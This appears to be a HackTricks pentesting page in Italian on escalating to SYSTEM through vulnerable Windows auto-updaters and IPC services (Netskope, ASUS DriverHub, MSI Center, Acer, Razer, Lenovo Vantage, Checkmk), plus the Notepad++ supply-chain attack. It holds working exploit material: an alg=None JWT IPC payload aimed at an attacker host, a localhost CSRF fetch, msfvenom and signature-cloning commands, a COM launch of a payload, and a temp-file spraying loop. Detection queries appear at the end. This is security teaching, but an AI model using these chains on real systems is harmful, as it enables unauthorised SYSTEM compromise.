# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di Windows local privilege escalation trovate in agenti endpoint enterprise e updater che espongono una superficie IPC a bassa frizione e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente con privilegi bassi può forzare l’enrollment verso un server controllato dall’attaccante e poi consegnare un MSI malevolo che il servizio SYSTEM installa.

Idee chiave che puoi riutilizzare contro prodotti simili:
- Abuse di una IPC localhost di un servizio privilegiato per forzare il re-enrollment o la riconfigurazione verso un server dell’attaccante.
- Implementare gli update endpoint del vendor, consegnare una rogue Trusted Root CA, e puntare l’updater a un pacchetto malevolo, “signed”.
- Evadere controlli deboli sul signer (CN allow-lists), flag digest opzionali e proprietà MSI lasche.
- Se la IPC è “encrypted”, derivare la chiave/IV da identificatori macchina world-readable memorizzati nel registry.
- Se il servizio limita i chiamanti per image path/process name, inject into un processo allow-listed oppure avviane uno suspended e fai bootstrap della tua DLL tramite una patch minimale del thread-context.

---
## 1) Forzare l’enrollment verso un server dell’attaccante tramite localhost IPC

Molti agenti distribuiscono un processo UI in user-mode che comunica con un servizio SYSTEM tramite localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso di exploit:
1) Crea un JWT enrollment token le cui claim controllano l’host backend (ad es. AddonUrl). Usa alg=None così non è richiesta alcuna signature.
2) Invia il messaggio IPC che invoca il provisioning command con il tuo JWT e il tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo rogue server per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Se la caller verification è basata su path/name, origina la request da un binary vendor allow-listed (vedi §4).

---
## 2) Hijacking the update channel per eseguire code come SYSTEM

Una volta che il client parla al tuo server, implementa gli endpoint attesi e indirizzalo verso un MSI dell’attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci JSON config con un updater interval molto breve, ad es.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nello store Local Machine Trusted Root.
3) /v2/checkupdate → Fornisci metadati che puntano a un MSI malevolo e a una versione falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: il servizio può controllare solo che il Subject CN sia “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare l'MSI.
- CERT_DIGEST property: includi una proprietà MSI benigna chiamata CERT_DIGEST. Nessuna enforcement all'installazione.
- Optional digest enforcement: il flag di config (ad esempio, check_msi_digest=false) disabilita la validazione crittografica extra.

Result: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

Patch-bypass lesson: se un vendor risponde con un allow-list di un piccolo set di domini “trusted” invece di autenticare crittograficamente la sorgente dell'update, cerca redirector o reverse proxy di proprietà del vendor che ti permettano comunque di deviare il traffico. Nel caso di Netskope, una ricerca successiva pubblica ha mostrato che un allow-list dell'epoca R129 poteva ancora essere abusato tramite `rproxy.goskope.com`, che faceva da proxy a contenuti Azure App Service controllati dall'attaccante. Considera gli hostname allow-list come un rallentamento, non come un trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Da R127, Netskope avvolgeva il JSON IPC in un campo encryptData che sembra Base64. Il reverse engineering ha mostrato AES con key/IV derivati da valori di registry leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la cifratura e inviare validi comandi cifrati da un utente standard. Suggerimento generale: se un agent improvvisamente “cifra” il suo IPC, cerca device ID, GUID del dispositivo, install ID sotto HKLM come materiale.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il path/name dell'immagine con binari vendor allow-listed situati sotto Program Files (ad esempio, stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo allow-listed (ad esempio, nsdiag.exe) e proxy IPC dall'interno.
- Avvia un binario allow-listed sospeso e fai bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole anti-tamper imposte dal driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

I prodotti spesso includono un driver minifilter/OB callbacks (ad esempio, Stadrv) per rimuovere i diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader in user-mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binario vendor con CREATE_SUSPENDED.
2) Ottieni gli handle che ti è ancora permesso usare: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo, e un thread handle con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME se patchi il codice su un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk iniziale, sicuramente mappato) con un piccolo stub che chiama LoadLibraryW sul path della tua DLL, poi torna indietro.
4) ResumeThread per attivare il tuo stub in-process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (l'hai creato tu), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (plugin Netskope) automatizza una rogue CA, la firma di MSI malevoli, e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un client IPC custom che costruisce messaggi IPC arbitrari (opzionalmente cifrati AES) e include l'injection di processo sospeso per originare da un binario allow-listed.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Quando affronti un nuovo endpoint agent o una suite “helper” per motherboard, un workflow rapido di solito basta per capire se stai guardando un target promettente per privesc:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerare le named pipe candidate:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Estrarre i dati di routing supportati dal registry usati dai server IPC basati su plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in user-mode. I frontend Electron/.NET packed spesso rivelano l'intero schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cerca il vero predicato di fiducia, non solo il codice che alla fine avvia il processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Pattern da prioritizzare:
- `CryptQueryObject`/parsing dei certificati senza `WinVerifyTrust` di solito significa che “il certificato esiste” è stato trattato come “il certificato è trusted”, consentendo certificate cloning o altri fake-signer trick.
- I controlli su substring/suffix di `Origin`, `Referer`, URL di download, nomi di processo o CN del signer non sono autenticazione. `contains(".vendor.com")` è di solito sfruttabile con domini lookalike controllati dall'attaccante.
- Se la GUI a basso privilegio decide “il file is trusted” e il broker SYSTEM usa solo quel risultato, patchare o reimplementare la DLL/JS lato client spesso bypassa del tutto il boundary (split validation in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo schedula da quel path, testa subito finestre di replacement TOCTOU e moduli plugin fratelli che espongono wrapper `ExecuteTask()` alternativi con controlli più deboli.

Per target molto basati su named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili da remoto prima di iniziare a reverse-engineerare il protocollo in profondità.

Se il target autentica i chiamanti solo tramite PID, image path o process name, trattalo come un piccolo ostacolo e non come un boundary: fare injection nel client legittimo, o effettuare la connessione da un processo in allow-list, spesso basta a soddisfare i controlli del server. Per i named pipe in particolare, [questa pagina sull'impersonation del client e sull'abuso delle pipe](named-pipe-client-impersonation.md) copre il primitive in modo più approfondito.

---
## 8) Modular add-in brokers autenticati solo da vendor signatures (Lenovo Vantage pattern)

Una variazione più recente che vale la pena cercare è il **signed-client RPC broker**: un processo desktop Lenovo-signed a basso privilegio parla con un servizio SYSTEM, e il servizio instrada comandi JSON verso un set di add-in descritti in XML sotto `%ProgramData%`. Una volta ottenuta code execution **dentro qualunque client signed accettato**, ogni contratto `runas="system"` diventa parte della tua attack surface.

Primitive ad alto valore osservate nella ricerca su Lenovo Vantage:
- **Trusting the caller perché è firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE firmato Lenovo in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`) così che codice arbitrario girasse dentro un client già trusted dal servizio.
- **Rilevamento della attack surface guidato dai manifest**: gli add-in sono dichiarati sotto `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti girano come `SYSTEM`, quindi enumerare quei manifest spesso rivela i veri privileged verbs più in fretta del reverse engineering del broker stesso.
- **Bug per-comando dietro il canale autenticato**: una volta dentro il client trusted, la ricerca pubblica ha trovato path-traversal + race condition in verb di update/install, abuso di raw-SQL in database privilegiati delle impostazioni e controlli di registry path basati su substring che hanno permesso scritture fuori dall'hive previsto.

Recon utile su un target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Takeaway pratico: ogni volta che una helper suite espone un broker che prima autentica il **caller process** e solo dopo smista verso decine di comandi plugin/add-in, non fermarti dopo aver bypassato il front-door trust check. Dumpa la tabella manifest/contract e fuzz ogni verbo ad alto privilegio in modo indipendente; il canale autenticato di solito nasconde diversi bug di second-stage.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub include un servizio HTTP in user-mode (ADU.exe) su 127.0.0.1:53000 che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell’origine esegue semplicemente `string_contains(".asus.com")` sull’header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall’attaccante come `https://driverhub.asus.com.attacker.tld` quindi supera il controllo e può inviare richieste che modificano lo stato da JavaScript. Vedi [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori pattern di bypass.

Flusso pratico:
1) Registra un dominio che contenga `.asus.com` e ospita lì una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint privilegiato (ad es. `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Invia il body JSON atteso dall’handler – il JS frontend packato mostra lo schema qui sotto.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche la CLI PowerShell mostrata qui sotto ha successo quando l'header Origin viene spoofato con il valore trusted:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualsiasi visita del browser al sito dell’attaccante diventa quindi un local CSRF da 1-click (o 0-click tramite `onload`) che avvia un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li mette in cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione della download URL riusa la stessa logica basata su substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe controlla solo che il PE contenga una signature e che la stringa Subject corrisponda ad ASUS prima di eseguirlo – nessun `WinVerifyTrust`, nessuna chain validation.

Per weaponize il flusso:
1) Crea un payload (ad es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il signer di ASUS dentro il payload (ad es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite il browser CSRF sopra.

Poiché sia i filtri Origin sia quelli URL sono basati su substring e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell’attaccante nel suo contesto elevato.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la signature tramite `CS_CommonAPI.EX_CA::Verify` (il certificate subject deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere successo).
3) Crea un scheduled task che esegue il file temporaneo come SYSTEM con arguments controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare Frame A che punta a un binario legittimo firmato MSI (garantisce che il controllo della signature passi e che il task venga accodato).
- Gareggiare con messaggi Frame B ripetuti che puntano a un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando lo scheduler si attiva, esegue il payload sovrascritto sotto SYSTEM nonostante abbia validato il file originale. Un exploitation affidabile usa due goroutine/thread che spammano CMD_AutoUpdateSDK finché la finestra TOCTOU non viene vinta.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato sotto `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attaccanti di instradare i comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` senza alcuna signature validation – qualsiasi user locale può puntarlo a `C:\Users\<user>\Desktop\payload.exe` e ottenere esecuzione SYSTEM in modo deterministico.
- Sniffare il loopback con Wireshark o instrumentare i binari .NET in dnSpy rivela rapidamente la mappatura Component ↔ command; client Go/ Python custom possono poi riprodurre i frame.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode`, e il suo discretionary ACL consente client remoti (ad es., `\\TARGET\pipe\treadstone_service_LightMode`). Inviare il command ID `7` con un file path invoca la routine di process-spawning del servizio.
- La client library serializza un magic terminator byte (113) insieme agli argomenti. L’instrumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sull’instrumentation) mostra che l’handler nativo mappa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a una integrity SID prima di chiamare `CreateProcessAsUser`.
- Sostituire 113 (`0x71`) con 114 (`0x72`) cade nel branch generico che mantiene il token SYSTEM completo e imposta una high-integrity SID (`S-1-16-12288`). Il binario avviato quindi gira come SYSTEM non ristretto, sia localmente sia cross-machine.
- Combinalo con il flag di installazione esposto (`Setup.exe -nocheck`) per avviare ACC anche su VM di laboratorio ed esercitare la pipe senza hardware del vendor.

Questi bug IPC evidenziano perché i servizi localhost devono imporre mutual authentication (ALPC SID, filtri `ImpersonationLevel=Impersonation`, token filtering) e perché ogni helper “run arbitrary binary” di un modulo deve condividere le stesse verifiche del signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 ha aggiunto un altro pattern utile a questa famiglia: un user a basso privilegio può chiedere a un helper COM di lanciare un processo tramite `RzUtility.Elevator`, mentre la decisione di trust viene delegata a una DLL in user-mode (`simple_service.dll`) invece di essere applicata in modo robusto all’interno del boundary privilegiato.

Percorso di exploitation osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere un avvio elevato.
- Nel public PoC, il gate della PE-signature dentro `simple_service.dll` viene patchato prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attaccante.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway generale: quando fai reversing di suite “helper”, non fermarti a localhost TCP o named pipes. Controlla le classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, poi verifica se il servizio privilegiato valida davvero il binary di destinazione oppure si fida solo di un risultato calcolato da una DLL client in user-mode patchabile. Questo pattern va oltre Razer: qualsiasi design separato in cui il broker ad alta privilegio consuma una decisione allow/deny dalla parte a basso privilegio è un potenziale surface di privesc.


---
## Esecuzione prevedibile di script temporanei durante la repair MSI (Checkmk Agent / CVE-2024-0670)

Alcuni Windows agents implementano ancora azioni privilegiate scrivendo un `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il filename è prevedibile e il servizio non ricrea in modo sicuro i file già esistenti, un utente a basso privilegio può pre-creare il futuro file temporaneo come **read-only** e far eseguire al processo privilegiato contenuto controllato dall'attaccante invece del proprio script.

Osservato nelle build vulnerabili di Checkmk Agent:
- pattern temporaneo: `cmk_all_<PID>_1.cmd`
- branch colpiti: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** del pacchetto agent memorizzato nella cache

Workflow pratico:
1. Stima un intervallo realistico di PID dai processi correnti o dal PID dell'agent in esecuzione.
2. Scrivi un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` oppure redirezione di `cmd.exe`; evita l'output PowerShell UTF-16 per i batch file).
3. Spruzza `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sull'intervallo candidato e imposta ogni file come read-only.
4. Avvia una repair dell'MSI in cache così il servizio privilegiato tenta di rigenerare e poi esegue lo script temporaneo.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Se il prodotto vulnerabile è installato con Windows Installer, associa il MSI in cache dal nome apparentemente casuale in `C:\Windows\Installer` al suo nome prodotto prima di attivare la repair:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Note operative:
- `qwinsta` è utile quando `msiexec /fa` fallisce da una shell WinRM non interattiva e devi capire se una sessione desktop/disconnessa esistente può attivare correttamente la riparazione.
- Questo pattern si generalizza ad altri endpoint agents e updater che **stage temp scripts in percorsi world-writable e poi li eseguono come SYSTEM**. Testa nomi prevedibili, semantica di create esclusiva mancante e flussi di repair/update che possono essere attivati on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Tra June 2025 e December 2025, gli attacker che hanno compromesso l'infrastruttura di hosting dietro il flusso di update di Notepad++ hanno servito in modo selettivo manifest maliziosi a vittime scelte. I vecchi updater basati su WinGUp non verificavano completamente l'autenticità degli update, quindi una risposta XML ostile poteva reindirizzare i client verso URL controllati dall'attacker. Poiché il client accettava contenuti HTTPS senza imporre sia una trusted certificate chain sia una valid PE signature sull'installer scaricato, le vittime hanno scaricato ed eseguito un trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: comprometti CDN/hosting e rispondi ai controlli di update con metadata controllati dall'attacker che puntano a un malicious download URL.
2. **Trojanized NSIS**: l'installer scarica/esegue un payload e abusa di due execution chains:
- **Bring-your-own signed binary + sideload**: include il signed Bitdefender `BluetoothService.exe` e inserisce un malicious `log.dll` nel suo search path. Quando il signed binary viene eseguito, Windows sideloads `log.dll`, che decripta e carica in modo reflectively il backdoor Chrysalis (protetto con Warbird + API hashing per ostacolare la static detection).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che usa Win32 APIs (ad es. `EnumWindowStationsW`) per injectare shellcode e stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Imporre la **certificate + signature verification** dell'installer scaricato (pin del vendor signer, rifiutare CN/chain non corrispondenti) e firmare il manifest di update stesso (ad es. XMLDSig). Bloccare i redirect controllati dal manifest a meno che non siano validati.
- Trattare il **BYO signed binary sideloading** come un pivot di detection post-download: alert quando un signed vendor EXE carica un nome DLL da fuori del suo canonical install path (ad es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater scarica/esegue installer da temp con non-vendor signatures.
- Monitorare gli **malware-specific artifacts** osservati in questa catena (utili come generic pivots): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%`, e stage di shellcode injection guidati da Lua.
- Notepad++ ha risposto rafforzando WinGUp in v8.8.9 e versioni successive: l'XML restituito ora è firmato (XMLDSig), e le build più recenti impongono la certificate + signature verification dell'installer scaricato invece di fidarsi solo del transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> avviando un installer non-Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi pattern si generalizzano a qualsiasi updater che accetta manifest non firmati o non riesce a fare il pin dei signer dell'installer—network hijack + malicious installer + sideloading BYO-signed porta a remote code execution sotto le sembianze di aggiornamenti “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
